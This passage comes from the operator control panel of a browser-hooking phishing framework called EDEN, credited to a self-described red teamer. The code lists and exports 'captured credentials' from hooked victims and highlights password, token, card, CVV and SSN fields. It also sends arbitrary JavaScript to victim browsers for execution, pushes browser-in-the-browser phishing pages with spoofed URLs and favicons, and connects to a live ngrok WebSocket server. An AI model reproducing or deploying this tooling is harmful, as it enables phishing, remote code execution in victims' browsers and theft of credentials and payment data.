                font-size: 14px;
                width: 100%;
            }
            /* Responsive */
            @media (max-width: 1200px) {.credentials-grid {grid-template-columns: repeat(2, 1fr);}}
            
            @media (max-width: 768px) {
                .container {padding: 1rem;}
                .credentials-grid {grid-template-columns: 1fr;}
                .header-content {padding: 0 15px;}
                .logo-text h1 {font-size: 28px;}
                .credential-content {padding: 0 20px 20px;}
                .credential-header {padding: 15px 20px;}
            }
        </style>
    </head>
    <body>
        <header class="header">
            <div class="header-content">
                <div class="header-left">
                    <div class="logo-text">
                        <h1>EDEN</h1>
                        <div class="tagline">Exploit & Dynamic Execution Network</div>
                    </div>
                    <div class="header-subtitle">Credentials Export Report</div>
                    <div class="timestamp">Generated: <span id="current-date">${new Date().toLocaleString()}</span></div>
                </div>
            </div>
        </header>
        
        <div class="container">
            <div class="credentials-grid">`;
                
                credentials.forEach((cred, index) => {
                    // Format timestamp
                    let formattedDate;
                    try {
                        formattedDate = new Date(cred.timestamp).toLocaleString();
                    } catch (e) {
                        formattedDate = 'Unknown';
                    }
                    
                    html += `
                    <div class="credential-card">
                        <div class="credential-header">
                            <h2 class="credential-title">Credential #${index + 1}</h2>
                        </div>
                        <div class="credential-content">
                            <div class="credential-metadata">
                                <div class="meta-item">
                                    <div class="meta-label">Captured:</div>
                                    <div class="meta-value">${formattedDate}</div>
                                </div>
                                <div class="meta-item">
                                    <div class="meta-label">URL:</div>
                                    <div class="meta-value">${cred.url || 'Unknown'}</div>
                                </div>
                                <div class="meta-item">
                                    <div class="meta-label">Client ID:</div>
                                    <div class="meta-value">${cred.clientId || 'Unknown'}</div>
                                </div>
                                <div class="meta-item">
                                    <div class="meta-label">IP:</div>
                                    <div class="meta-value">${cred.ip || 'Unknown'}</div>
                                </div>
                            </div>`;
                        
                    if (cred.data && Object.keys(cred.data).length > 0) {
                        html += `
                        <div class="data-section">
                            <h3>Form Data</h3>
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th>Field</th>
                                        <th>Value</th>
                                    </tr>
                                </thead>
                                <tbody>`;
                        
                        for (const key in cred.data) {
                            html += `
                                <tr>
                                    <td class="field-name">${key}</td>
                                    <td>${cred.data[key] || '<em style="color:var(--gray-400)">Empty</em>'}</td>
                                </tr>`;
                        }
                        
                        html += `
                                </tbody>
                            </table>
                        </div>`;
                    } else {
                        html += `
                        <div class="data-section">
                            <div style="text-align: center; padding: 30px 0; color: var(--gray-500);">
                                <div style="font-size: 3rem; margin-bottom: 10px;">📝</div>
                                <p>No credential data available</p>
                            </div>
                        </div>`;
                    }
                    
                    html += `</div>
                    </div>`;
                });
                
                html += `
                </div>
            </div>`;
                
                // Add footer without breaking the template literal
                html += `
            <div class="footer-container">
                <div class="footer-content">
                    <div class="footer-text">
                        <p>Exported from EDEN</p>
                    </div>
                    <div class="author-info">
                        <div class="author-details">
                            <div class="author-name">Varun</div>
                            <div class="author-role">Red Teamer | Web Penetration Tester | Ethical Hacker</div>
                            <div class="social-links">
                                <a href="https://www.linkedin.com/in/varun-‎-775a77310" target="_blank" class="social-link" title="LinkedIn">
                                    <i class="fab fa-linkedin-in"></i>
                                </a>
                                <a href="https://github.com/mr-pentest" target="_blank" class="social-link" title="GitHub">
                                    <i class="fab fa-github"></i>
                                </a>
                                <a href="#" class="social-link" title="Twitter">
                                    <i class="fab fa-twitter"></i>
                                </a>
                                <a href="#" class="social-link" title="Discord">
                                    <i class="fab fa-discord"></i>
                                </a>
                                <a href="#" class="social-link" title="Instagram">
                                    <i class="fab fa-instagram"></i>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="copyright">
                        <p>© ${new Date().getFullYear()} EDEN Security | Developed by Varun</p>
                    </div>
                </div>
            </div>
            
           
        </body>
        </html>`;
                
            // Create blob and download
            const blob = new Blob([html], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_credentials.html`;
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            // Clean up URL
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            // Show success message
            alert(`Successfully exported ${credentials.length} credential records to HTML`);
        }
        
        // Create TXT export
        function exportAsTxt(credentials) {
            let text = `Eden Credentials Export
Generated: ${new Date().toLocaleString()}

`;
            
            credentials.forEach((cred, index) => {
                // Format timestamp
                let formattedDate;
                try {
                    formattedDate = new Date(cred.timestamp).toLocaleString();
                } catch (e) {
                    formattedDate = 'Unknown';
                }
                
                text += `==== Credential #${index + 1} ====\n`;
                text += `Captured: ${formattedDate}\n`;
                text += `URL: ${cred.url || 'Unknown'}\n`;
                text += `Client ID: ${cred.clientId || 'Unknown'}\n`;
                text += `IP: ${cred.ip || 'Unknown'}\n\n`;
                
                if (cred.data && Object.keys(cred.data).length > 0) {
                    text += `Form Data:\n`;
                    for (const key in cred.data) {
                        text += `  ${key}: ${cred.data[key] || ''}\n`;
                    }
                } else {
                    text += `No credential data available\n`;
                }
                
                text += `\n\n`;
            });
            
            // Create blob and download
            const blob = new Blob([text], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_credentials.txt`;
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            // Clean up URL
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            // Show success message
            alert(`Successfully exported ${credentials.length} credential records to TXT`);
        }
        
        // Create JSON export
        function exportAsJson(credentials) {
            // Format data for better readability
            const exportData = credentials.map(cred => {
                // Format timestamp
                let formattedDate;
                try {
                    formattedDate = new Date(cred.timestamp).toLocaleString();
                } catch (e) {
                    formattedDate = 'Unknown';
                }
                
                return {
                    ...cred,
                    formattedTimestamp: formattedDate
                };
            });
            
            // Create JSON file
            const jsonStr = JSON.stringify(exportData, null, 2);
            const blob = new Blob([jsonStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            
            // Create download link
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_credentials.json`;
            
            // Trigger download
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            // Clean up URL
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            // Show success message
            alert(`Successfully exported ${exportData.length} credential records to JSON`);
        }
        
        // Export credentials function
        function exportAllCredentials() {
            const selectedIds = getSelectedCredentials();
            
            // Determine which credentials to export
            let credentialsToExport;
            if (selectedIds.length > 0) {
                // Export only selected credentials
                credentialsToExport = capturedCredentials.filter(cred => 
                    selectedIds.includes(cred.id)
                );
            } else {
                // Export all if none selected
                credentialsToExport = [...capturedCredentials];
            }
            
            if (credentialsToExport.length === 0) {
                alert('No credentials to export');
                return;
            }
            
            try {
                // Get selected format
                const formatSelect = document.getElementById('exportFormatSelect');
                const format = formatSelect ? formatSelect.value : 'json';
                
                // Export in the selected format
                switch(format) {
                    case 'pdf':
                        exportAsPdf(credentialsToExport);
                        break;
                    case 'html':
                        exportAsHtml(credentialsToExport);
                        break;
                    case 'txt':
                        exportAsTxt(credentialsToExport);
                        break;
                    case 'json':
                    default:
                        exportAsJson(credentialsToExport);
                        break;
                }
                
                
                
            } catch (error) {
                console.error('Error exporting credentials:', error);
                alert('Failed to export credentials: ' + error.message);
            }
        }
        
        // Update credentials UI
        function updateCredentialsUI() {
            const credentialsList = document.getElementById('credentialsList');
            const emptyState = document.getElementById('credentialsEmptyState');
            
            if (!credentialsList || !emptyState) return;
            
            // Clear existing cards
            credentialsList.innerHTML = '';
            
            // Show empty state if no credentials
            if (capturedCredentials.length === 0) {
                emptyState.style.display = 'block';
                credentialsList.style.display = 'none';
                return;
            }
            
            // Hide empty state and show credentials
            emptyState.style.display = 'none';
            credentialsList.style.display = 'grid';
            credentialsList.style.gridTemplateColumns = 'repeat(auto-fill, minmax(400px, 1fr))';
            credentialsList.style.gap = '20px';
            credentialsList.style.marginTop = '20px';
            
            // Add each credential
            capturedCredentials.forEach(cred => {
                // Create card similar to client cards in connection section
                const card = document.createElement('div');
                card.className = 'client-card credential-card';
                card.id = `credential-${cred.id}`;
                card.setAttribute('data-cred-id', cred.id);
                card.style.position = 'relative';
                card.style.cursor = 'pointer';
                
                // Add selection checkbox and indicator
                const checkbox = document.createElement('input');
                checkbox.type = 'checkbox';
                checkbox.className = 'credential-select-checkbox';
                checkbox.id = `select-${cred.id}`;
                checkbox.addEventListener('change', function() {
                    if (this.checked) {
                        card.classList.add('selected');
                    } else {
                        card.classList.remove('selected');
                    }
                    updateExportButtonState();
                });
                
                const indicator = document.createElement('div');
                indicator.className = 'credential-select-indicator';
                
                card.appendChild(checkbox);
                card.appendChild(indicator);
                
                // Handle credential card clicks based on selection mode
                card.addEventListener('click', function(e) {
                    // Check if selection mode is active
                    const selectionModeActive = document.getElementById('selectionModeToggle') && 
                                              document.getElementById('selectionModeToggle').checked;
                    
                   
                    // In normal mode, the default behavior will occur (drawer opens)
                });
                

                // Format timestamp
                let formattedDate;
                try {
                    formattedDate = new Date(cred.timestamp).toLocaleString();
                } catch (e) {
                    formattedDate = 'Unknown';
                }
                
                // Create IP display and header like client cards
                let header = `
                    <div class="client-ip">
                        <i class="fas fa-network-wired"></i>
                        ${cred.ip || 'Unknown IP'}
                        <span class="client-status status-online"></span>
                    </div>
                    <div style="display: flex; align-items: center; margin: 10px 0;">
                        <span class="status-text online-text">Captured</span>
                        <span style="font-size: 0.7rem; margin-left: 10px; color: #64748b;">${formattedDate}</span>
                    </div>
                `;
                
                // Add View Data button
                header += `
                    <div class="client-actions" style="margin-top: 0.5rem;">
                        <button class="select-btn" data-credid="${cred.id}">
                            <i class="fas fa-eye"></i> View Data
                        </button>
                    </div>
                    <div id="details-${cred.id}" class="client-details">
                        <div class="details-grid">
                            <div class="detail-item">
                                <span class="detail-label">Client:</span>
                                <span>${cred.clientId || 'Unknown'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">URL:</span>
                                <span>${cred.url || 'Unknown'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Time:</span>
                                <span>${formattedDate}</span>
                            </div>
                            ${cred.source ? `
                            <div class="detail-item">
                                <span class="detail-label">Source:</span>
                                <span>${cred.source}</span>
                            </div>` : ''}
                        </div>
                `;
                
                // Add credential data
                let content = '<div style="margin-top: 15px;">';
                
                // Add form metadata if available
                if (cred.formMetadata && Object.keys(cred.formMetadata).length > 0) {
                    content += '<h4 style="margin-bottom: 10px; color: var(--primary-dark); font-size: 1rem;">Form Metadata</h4>';
                    content += '<div style="display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px;">';
                    
                    // Add form type badges
                    if (cred.formMetadata.hasPassword) {
                        content += '<span style="background-color: #e53e3e; color: white; padding: 3px 8px; border-radius: 12px; font-size: 12px;">Password Form</span>';
                    }
                    if (cred.formMetadata.hasEmail) {
                        content += '<span style="background-color: #3182ce; color: white; padding: 3px 8px; border-radius: 12px; font-size: 12px;">Email Form</span>';
                    }
                    if (cred.formMetadata.formMethod) {
                        content += `<span style="background-color: #718096; color: white; padding: 3px 8px; border-radius: 12px; font-size: 12px;">Method: ${cred.formMetadata.formMethod.toUpperCase()}</span>`;
                    }
                    if (cred.formMetadata.inputCount) {
                        content += `<span style="background-color: #38a169; color: white; padding: 3px 8px; border-radius: 12px; font-size: 12px;">${cred.formMetadata.inputCount} Fields</span>`;
                    }
                    if (cred.formMetadata.formAction) {
                        content += `<div style="width: 100%; margin-top: 5px; font-size: 12px; color: #4a5568; word-break: break-all;">Action: ${cred.formMetadata.formAction}</div>`;
                    }
                    
                    content += '</div>';
                }
                
                content += '<h4 style="margin-bottom: 10px; color: var(--primary-dark); font-size: 1rem;">Form Data</h4>';
                content += '<table style="width: 100%; border-collapse: collapse;">';
                content += '<thead><tr style="border-bottom: 1px solid var(--border);">';
                content += '<th style="text-align: left; padding: 8px; color: var(--dark);">Field</th>';
                content += '<th style="text-align: left; padding: 8px; color: var(--dark);">Value</th>';
                content += '</tr></thead><tbody>';
                
                // Add each field
                if (cred.data && typeof cred.data === 'object') {
                    const credentialFields = ['username', 'password', 'email', 'pass', 'name', 'login', 'user', 'account', 'id', 'token', 'auth', 'key', 'secret', 'credential', 'phone', 'mobile', 'card', 'credit', 'cvv', 'ssn', 'social', 'birth', 'address'];
                    
                    Object.entries(cred.data).forEach(([key, value]) => {
                        // Check if this is a credential field
                        const isCredential = credentialFields.some(field => 
                            key.toLowerCase().includes(field)
                        );
                        
                        // Check if this is a password field by value pattern (e.g., contains * or •)
                        const isPasswordValue = typeof value === 'string' && 
                            (value.match(/^[\*\•]+$/) || 
                             (key.toLowerCase().includes('pass') && value.length > 0));
                        
                        // Highlight credential fields
                        let rowStyle = '';
                        let keyStyle = '';
                        
                        if (isCredential) {
                            rowStyle = 'background-color: rgba(0, 102, 255, 0.05);';
                            keyStyle = 'font-weight: 600; color: var(--primary-dark);';
                        }
                        
                        if (isPasswordValue) {
                            rowStyle = 'background-color: rgba(220, 38, 38, 0.05);';
                            keyStyle = 'font-weight: 600; color: #dc2626;';
                        }
                        
                        content += `<tr style="border-bottom: 1px solid rgba(153, 194, 255, 0.2); ${rowStyle}">`;
                        content += `<td style="padding: 8px; ${keyStyle}">${key}</td>`;
                        content += `<td style="padding: 8px;">${value}</td>`;
                        content += '</tr>';
                    });
                } else {
                    content += '<tr><td colspan="2" style="padding: 8px;">No data available</td></tr>';
                }
                
                content += '</tbody></table></div></div>';
                
                // Set card content
                card.innerHTML = header + content;
                
                // Add card to list
                credentialsList.appendChild(card);
                
                // Add click event to toggle details
                card.addEventListener('click', function() {
                    // Toggle this credential's details independently
                    const details = document.getElementById(`details-${cred.id}`);
                    details.classList.toggle('show');
                    
                    // Update the button text
                    const button = this.querySelector('.select-btn');
                    if (details.classList.contains('show')) {
                        button.innerHTML = '<i class="fas fa-eye-slash"></i> Hide Data';
                    } else {
                        button.innerHTML = '<i class="fas fa-eye"></i> View Data';
                    }
                });
                
                // Add click event to view button
                const viewBtn = card.querySelector('.select-btn');
                if (viewBtn) {
                    viewBtn.addEventListener('click', function(e) {
                        e.stopPropagation();
                        const details = document.getElementById(`details-${cred.id}`);
                        const showing = details.classList.toggle('show');
                        
                        // Update button text
                        this.innerHTML = showing ? 
                            '<i class="fas fa-eye-slash"></i> Hide Data' : 
                            '<i class="fas fa-eye"></i> View Data';
                    });
                }
            });
        }
        
        function saveToLocalStorage() {
            localStorage.setItem('files', JSON.stringify(Array.from(fileStorage.entries())));
        }

        // Eden server-side event templates (for UI only)
        const EDEN_SERVER_TEMPLATES_KEY = 'eden_server_templates';

        function getServerTemplates() {
            try {
                const raw = localStorage.getItem(EDEN_SERVER_TEMPLATES_KEY);
                return raw ? JSON.parse(raw) || {} : {};
            } catch (e) {
                console.error('Failed to parse eden_server_templates', e);
                return {};
            }
        }

        function setServerTemplates(templates) {
            try {
                localStorage.setItem(EDEN_SERVER_TEMPLATES_KEY, JSON.stringify(templates || {}));
            } catch (e) {
                console.error('Failed to store eden_server_templates', e);
            }
        }

        function saveServerTemplate(name, snapshot) {
            if (!name || !snapshot || !snapshot.type) return;
            const all = getServerTemplates();
            const compositeKey = name + '_' + snapshot.type;
            all[compositeKey] = snapshot;
            setServerTemplates(all);
        }

        function clearServerTemplates() {
            try {
                localStorage.removeItem(EDEN_SERVER_TEMPLATES_KEY);
            } catch (e) {
                console.error('Failed to clear eden_server_templates', e);
            }
        }
        
        function handleFile(file) {
            const validTypes = ['html', 'js', 'mhtml', 'css'];
            const fileExt = file.name.split('.').pop().toLowerCase();
            if (!validTypes.includes(fileExt)) {
                alert('Please upload HTML, JS, MHTML, or CSS files');
                return;
            }
            const reader = new FileReader();
            reader.onload = function(event) {
                fileStorage.set(file.name, {
                    name: file.name,
                    type: file.type,
                    size: file.size,
                    data: event.target.result,
                    extension: fileExt
                });
                latestFileName = file.name;
                if (fileExt === 'html') {
                    currentHtmlContent = event.target.result;
                }
                updateFileInfo(file);
                updateFileList();
                saveToLocalStorage();
            };
            reader.readAsText(file);
        }

        function updateFileInfo(file) {
            const fileInfo = document.getElementById('fileInfo');
            const fileData = fileStorage.get(file.name);
            if (fileData) {
                fileInfo.innerHTML = `
                    <p><strong>File Name:</strong> ${file.name}</p>
                    <p><strong>File Type:</strong> ${file.type || 'text/' + file.name.split('.').pop()}</p>
                    <p><strong>Size:</strong> ${formatFileSize(file.size)}</p>
                `;
            } else {
                fileInfo.innerHTML = '<p>No file selected</p>';
            }
        }
        
        function executeCode() {
            const code = codeInput.value;
            if (!code.trim()) return;
            let htmlContent = '';
            let cssContent = '';
            let jsContent = '';
            const htmlMatch = code.match(/<html[^>]*>([\s\S]*)<\/html>/i);
            const styleMatch = code.match(/<style[^>]*>([\s\S]*)<\/style>/ig);
            const scriptMatch = code.match(/<script[^>]*>([\s\S]*)<\/script>/ig);
            
            if (htmlMatch) {
                htmlContent = code;
                currentHtmlContent = code;
            } else {
                htmlContent = `<html><body>${code}</body></html>`;
                currentHtmlContent = htmlContent;
            }
            
            if (styleMatch) {
                cssContent = styleMatch.map(style => {
                    const content = style.match(/<style[^>]*>([\s\S]*)<\/style>/i);
                    return content ? content[1] : '';
                }).join('\n');
            }
            
            if (scriptMatch) {
                jsContent = scriptMatch.map(script => {
                    const content = script.match(/<script[^>]*>([\s\S]*)<\/script>/i);
                    return content ? content[1] : '';
                }).join('\n');
            }
            
            // Get reload toggle state
            const shouldReload = document.getElementById('displayReloadToggle').checked;
            
            // Send the content to selected clients or all if none selected
            sendToSelectedClients({
                type: 'executeContent',
                content: htmlContent,
                fileName: 'editor.html',
                resources: {
                    css: cssContent ? [cssContent] : [],
                    js: jsContent ? [jsContent] : []
                },
                reload: shouldReload
            });
        }
        
        function viewEditorContent() {
            const code = codeInput.value;
            if (!code.trim()) return;
            sendToSelectedClients({
                type: 'showsContent',
                content: code,
                fileName: 'editor.html',
                resources: {}
            });
        }
        
        function BITBEditorContent() {
            const code = codeInput.value;
            if (!code.trim()) return;
            sendToSelectedClients({
                type: 'BITBContent',
                content: code,
                fileName: 'editor.html'
            });
        }
        
        // Store file-specific BITB customization
        const fileBITBCustom = {};
        
        function BITBFile(fileName, customFavicon, customUrl) {
            const fileData = fileStorage.get(fileName);
            if (!fileData) return;
            
            const reload = document.getElementById('displayReloadToggle').checked;
            // Fixed reload delay to 1.5 seconds (matching test.html)
            const reloadDelay = 1.5;
            
            const messageData = {
                type: 'BITBContent',
                content: fileData.data,
                fileName: fileName,
                reload: reload,
                reloadDelay: reloadDelay
            };
            
            // Use provided values or stored values for this file
            if (customFavicon || fileBITBCustom[fileName]?.favicon) {
                messageData.customFavicon = customFavicon || fileBITBCustom[fileName].favicon;
            }
            if (customUrl || fileBITBCustom[fileName]?.url) {
                messageData.customUrl = customUrl || fileBITBCustom[fileName].url;
            }
            
            console.log('BITBFile sending:', messageData);
            sendToSelectedClients(messageData);
        }

        function openBITBEditorForFile(fileName) {
            const bitbModal = document.getElementById('bitb-custom-modal');
            const bitbFaviconInput = document.getElementById('bitb-favicon-input');
            const bitbUrlInput = document.getElementById('bitb-url-input');
            const bitbSaveBtn = document.getElementById('bitb-save-btn');
            if (!bitbModal || !bitbFaviconInput || !bitbUrlInput || !bitbSaveBtn) return;
            bitbFaviconInput.value = fileBITBCustom[fileName]?.favicon || '';
            bitbUrlInput.value = fileBITBCustom[fileName]?.url || '';
            bitbModal.style.display = 'flex';
            const originalHandler = bitbSaveBtn.onclick;
            bitbSaveBtn.onclick = function() {
                fileBITBCustom[fileName] = {
                    favicon: bitbFaviconInput.value.trim() || null,
                    url: bitbUrlInput.value.trim() || null
                };
                bitbModal.style.display = 'none';
                bitbFaviconInput.value = '';
                bitbUrlInput.value = '';
                bitbSaveBtn.onclick = originalHandler;
            };
        }
        
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }       
        
        function clearUploadedData() {
    localStorage.removeItem('uploadedFiles');
    fileStorage.clear();
    updateFileList();
    document.getElementById('fileInfo').innerHTML = '<p>No file selected</p>';
    document.getElementById('fileInput').value = '';
    codeInput.value = '';
    latestFileName = null;
    currentHtmlContent = null;
}
        
        function clearClientData() {
            // Hide credentials section if needed
            const credentialsSection = document.getElementById('credentialsSection');
            const credentialsInfo = document.getElementById('credentialsInfo');
            if (credentialsSection) credentialsSection.style.display = 'none';
            if (credentialsInfo) credentialsInfo.innerHTML = '';
            
            // Use the same message type as the blur section's clean button
            if (ws && ws.readyState === WebSocket.OPEN) {
                const message = {
                    type: 'Sudoclean'
                };
                
                // Send to selected clients
                sendToSelectedClients(message);
                
                showStatusMessage('success', 'Display cleaned');
            } else {
                showStatusMessage('error', 'WebSocket connection is not available');
            }
        }
        // Function to upload all files from control.php's localStorage to client.html localStorage
        function uploadToClientStorage() {
    // Check if there are any files in fileStorage
    if (fileStorage.size === 0) {
        alert('No files available to upload');
        return;
    }
    
    // Get reload toggle state - ensure it's a boolean value
    const reloadToggleElement = document.getElementById('displayReloadToggle');
    if (!reloadToggleElement) {
        console.error('Reload toggle element not found!');
        return;
    }
    
    const shouldReload = Boolean(reloadToggleElement.checked);
    console.log(`Upload with reload flag: ${shouldReload} (${typeof shouldReload})`);
    console.log('Reload toggle checked state:', reloadToggleElement.checked);
    
    // Upload all files from fileStorage
    let uploadCount = 0;
    fileStorage.forEach((fileData, fileName) => {
        // Create the message with the reload flag
        const message = {
            type: 'storeFile',
            fileName: fileName,
            content: fileData.data,
            reload: shouldReload  // Include reload flag based on toggle state
        };
        
        // Log the exact message being sent
        console.log(`Sending file ${fileName} with message:`, JSON.stringify(message));
        
        // Send the file to selected clients via WebSocket
        sendToSelectedClients(message);
        uploadCount++;
    });
    
    console.log(`${uploadCount} files uploaded to client storage with reload flag: ${shouldReload}`);
    
    // Also handle any newly selected files if present
    const fileInput = document.getElementById('fileInput');
    if (fileInput.files.length > 0) {
        Array.from(fileInput.files).forEach(file => {
            const reader = new FileReader();
            reader.onload = function(e) {
                const content = e.target.result;
                
                // Create the message with the reload flag
                const message = {
                    type: 'storeFile',
                    fileName: file.name,
                    content: content,
                    reload: shouldReload  // Include reload flag based on toggle state
                };
                
                // Log the exact message being sent
                console.log(`Sending file ${file.name} with message:`, JSON.stringify(message));
                
                // Send the file to selected clients via WebSocket
                sendToSelectedClients(message);
            };
            
            reader.onerror = function() {
                console.error(`Error reading file: ${file.name}`);
            };
            
            reader.readAsText(file);
        });
    }
}
        // Function to clear all uploaded files from client.html localStorage
        function clearClientStorage() {
    if (confirm('Are you sure you want to clear all uploaded files from client storage?')) {
        sendToSelectedClients({
            type: 'clearFiles'
        });
    }
}
        
        function getFileIcon(extension) {
    const iconMap = {
        'html': '📄',
        'js': '📜',
        'css': '🎨',
        'jpg': '🖼️',
        'jpeg': '🖼️',
        'png': '🖼️',
        'gif': '🖼️',
        'pdf': '📕',
        'doc': '📘',
        'docx': '📘',
        'xls': '📗',
        'xlsx': '📗',
        'ppt': '📙',
        'pptx': '📙',
        'zip': '📦',
        'rar': '📦',
        'exe': '⚙️',
        'bat': '⚙️',
        'cmd': '⚙️',
        'sh': '⚙️',
        'py': '🐍',
        'mp3': '🎵',
        'mp4': '🎬',
        'avi': '🎬',
        'mov': '🎬'
    };
    return iconMap[extension.toLowerCase()] || '📄';
}
        
        function updateFileList() {
            const fileList = document.getElementById('fileList');
            fileList.innerHTML = '';
            
            if (fileStorage.size === 0) {
                fileList.innerHTML = '<p class="no-files">No files available</p>';
                return;
            }
            
            fileStorage.forEach((fileData, fileName) => {
                const li = document.createElement('li');
                li.className = 'file-item';
                li.innerHTML = `
                    <div class="file-name">
                        <span class="file-icon">${getFileIcon(fileName)}</span>
                        <span>${fileName}</span>
                    </div>
                    <div class="file-actions">
                    <button class="btn primary small" data-eden-mode="display" data-file="${fileName}" onclick="handleFileAction('${fileName}')">${fileName.endsWith('.js') ? 'Execute' : 'Display'}</button>
                    ${!fileName.endsWith('.js') ? `<button onclick="BITBFile('${fileName}')" class="btn primary small" data-eden-mode="bitb" data-file="${fileName}">BITB</button>` : ''}
                        <button onclick="uploadSingleFile('${fileName}')" class="btn success small">Upload</button>
                        <button onclick="clearSingleFile('${fileName}')" class="btn warning small">Clear</button>
                        <button onclick="removeFile('${fileName}')" class="btn danger small">Remove</button>
                    </div>
                `;
                fileList.appendChild(li);
            });
        }
        
        function getFileIcon(fileName) {
            const ext = fileName.split('.').pop().toLowerCase();
            switch(ext) {
                case 'html': return '📄';
                case 'js': return '📜';
                case 'css': return '🎨';
                case 'mhtml': return '🌐';
                default: return '📁';
            }
        }
        
        function removeFile(fileName) {
            if (confirm(`Are you sure you want to remove ${fileName}?`)) {
                fileStorage.delete(fileName);
                updateFileList();
                saveToLocalStorage();
            }
        }
        
        function uploadSingleFile(fileName) {
            const fileData = fileStorage.get(fileName);
            if (!fileData) return;
            
            // Get reload toggle state - ensure it's a boolean value
            const reloadToggleElement = document.getElementById('displayReloadToggle');
            if (!reloadToggleElement) {
                console.error('Reload toggle element not found!');
                return;
            }
            
            const shouldReload = Boolean(reloadToggleElement.checked);
            console.log(`Upload single file with reload flag: ${shouldReload} (${typeof shouldReload})`);
            
            // Create the message with the reload flag
            const message = {
                type: 'storeFile',
                fileName: fileName,
                content: fileData.data,
                reload: shouldReload  // Include reload flag based on toggle state
            };
            
            // Log the exact message being sent
            console.log(`Sending file ${fileName} with message:`, JSON.stringify(message));
            
            // Send the file to selected clients via WebSocket
            sendToSelectedClients(message);
            
            console.log(`File ${fileName} uploaded to client storage with reload flag: ${shouldReload}`);
        }
        
        function clearSingleFile(fileName) {
            if (confirm(`Are you sure you want to clear ${fileName} from client storage?`)) {
                // Send request to clear this specific file from client.html localStorage
                sendToSelectedClients({
                    type: 'clearSingleFile',
                    fileName: fileName
                });
            }
        }

        function handleFileAction(fileName) {
            const fileData = fileStorage.get(fileName);
            if (!fileData) return;
            
            if (fileData.extension === 'js') {
                // Get reload toggle state
                const shouldReload = document.getElementById('displayReloadToggle').checked;
                
                // Send JavaScript directly to selected clients for execution
                sendToSelectedClients({
                    type: 'executeContent',
                    content: fileData.data,
                    fileName: fileName,
                    reload: shouldReload
                });
                
                console.log(`Sent JavaScript file ${fileName} for execution`);
                return;
            }
            
            if (fileData.extension === 'html') {
                currentHtmlContent = fileData.data;
                latestFileName = fileName;
                viewLatestFile();
            }
        }

        function viewLatestFile() {
            if (!latestFileName) return;
            const fileData = fileStorage.get(latestFileName);
            if (!fileData) return;
            // Get reload toggle state
            const shouldReload = document.getElementById('displayReloadToggle').checked;
            
            // Create a fullscreen version with CSS to make it display at 100% width/height
            const fullscreenContent = `
            <style>
                html, body {
                    margin: 0;
                    padding: 0;
                    width: 100%;
                    height: 100%;
                    overflow: auto; /* Allow scrolling */
                }
                #fullscreen-container {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    z-index: 9999;
                    overflow: auto; /* Allow scrolling */
                    background-color: white;
                }
                /* Make content inside the container scrollable */
                #fullscreen-content {
                    width: 100%;
                    min-height: 100%;
                    padding: 10px;
                    box-sizing: border-box;
                }
            </style>
            <div id="fullscreen-container">
                <div id="fullscreen-content">
                    ${fileData.data}
                </div>
            </div>
            `;
            
            // Send to selected clients
            sendToSelectedClients({
                type: 'showsContent',
                content: fullscreenContent,
                fileName: latestFileName,
                resources: {},
                reload: shouldReload,
                clearBlur: true // Add flag to clear blur effect
            });
            
            showStatusMessage('success', `Displaying ${latestFileName} in full screen`);
        }


        // DOM Elements and variables
        const sidebarLinks = document.querySelectorAll('.sidebar-menu-item a');
        const contentSections = document.querySelectorAll('.content-section');
        const toggleSidebarBtn = document.querySelector('.toggle-sidebar');
        const dropZone = document.getElementById('dropZone');
        const fileInput = document.getElementById('fileInput');
        const codeInput = document.getElementById('codeInput');
        let latestFileName = null;
        let currentHtmlContent = null;
        let fileStorage = new Map();
        const sidebar = document.querySelector('.sidebar');
        const clientList = document.getElementById('clientList');
        const emptyState = document.getElementById('emptyState');
        const clearAllBtn = document.getElementById('clearAllBtn');
        const selectionBar = document.getElementById('selectionBar');
        const selectedCount = document.getElementById('selectedCount');
        const cancelSelectionBtn = document.getElementById('cancelSelectionBtn');
        const communicationInterface = document.getElementById('communicationInterface');
        const selectedIpDisplay = document.getElementById('selectedIpDisplay');
        const messageInput = document.getElementById('messageInput');
        const closeCommBtn = document.getElementById('closeCommBtn');
        const sendMessageBtn = document.getElementById('sendMessageBtn');
        
        // WebSocket connection
        let ws;
        let clients = {};
        let connectionTimeouts = {};
        let selectedClients = [];
        // Cache of stylesheets per client for immediate injection on html updates
        window._clientStyleCache = window._clientStyleCache || {};
        window._clientHtmlCache = window._clientHtmlCache || {};
        
        // Function to switch between sections
        function switchSection(sectionId) {
            // Hide all sections
            contentSections.forEach(section => {
                section.classList.remove('active');
            });
            
            // Remove active class from all links
            sidebarLinks.forEach(link => {
                link.classList.remove('active');
            });
            
            // Show selected section
            const selectedSection = document.getElementById(sectionId);
            if (selectedSection) {
                selectedSection.classList.add('active');
            }
            
            // Add active class to clicked link
            const selectedLink = document.querySelector(`[data-section="${sectionId}"]`);
            if (selectedLink) {
                selectedLink.classList.add('active');
            }
        }
        
        // Initialize WebSocket connection
        function initWebSocket() {
            ws = new WebSocket('wss://issuant-unglaciated-yosef.ngrok-free.dev');
           //   ws = new WebSocket('wss://304a-2401-4900-1c71-d522-2836-b256-6d76-dc0c.ngrok-free.app ');
